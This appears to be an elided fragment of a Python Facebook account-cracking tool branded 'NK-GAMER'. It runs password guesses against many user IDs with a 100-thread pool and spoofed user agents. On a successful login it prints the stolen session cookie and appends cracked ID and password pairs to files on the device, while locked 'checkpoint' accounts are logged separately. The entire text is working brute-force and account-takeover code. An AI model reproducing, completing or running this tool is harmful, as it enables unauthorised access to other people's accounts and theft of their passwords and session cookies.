...
for sat in range(1000):
    ...
    ugen.append(uaku2)
logo=("""
\x1b[1;90m/ _   _ _  __  ____
\x1b[1;90m/ | \ | | |/ / / ___| __ _ _ __ ___   ___ _ __
\x1b[1;90m/ |  \| | ' / | |  _ / _` | '_ ` _ \ / _ \ '__|
\x1b[1;90m/ | \  | . \ | |_| | (_| | | | | | |  __/ |
...
def fuck():
   ...
   # os.system('xdg-open https://www.facebook.com/profile.php?id=100069938063027')
    ...
    with ThreadPool(max_workers=100) as NKGAMER:
        ...
        #os.system('xdg-open https://www.facebook.com/profile.php?id=100069938063027')
        tl = str(len(user))
        print('\033[1;37m[\033[1;32mNK✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32mNK✓\033[1;32m] SOME ID,S WAS LOCKED ')
        print('\033[1;37m[\033[1;32mNK✓\033[1;32m] TOOL CREATED BY NK-GAMER ')
        print('\033[1;37m[\033[1;32mNK✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;96m═════════════════════════════════════════════')
        for guru in user:
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[NK-GAMER-OK💚] {uid} • {ps}" '  \n\033[1;33m [❤️]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🙈] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/NK-GAMER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[NK-GAMER-CP😭] {uid} • {ps}")
                open('/sdcard/NK-GAMER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
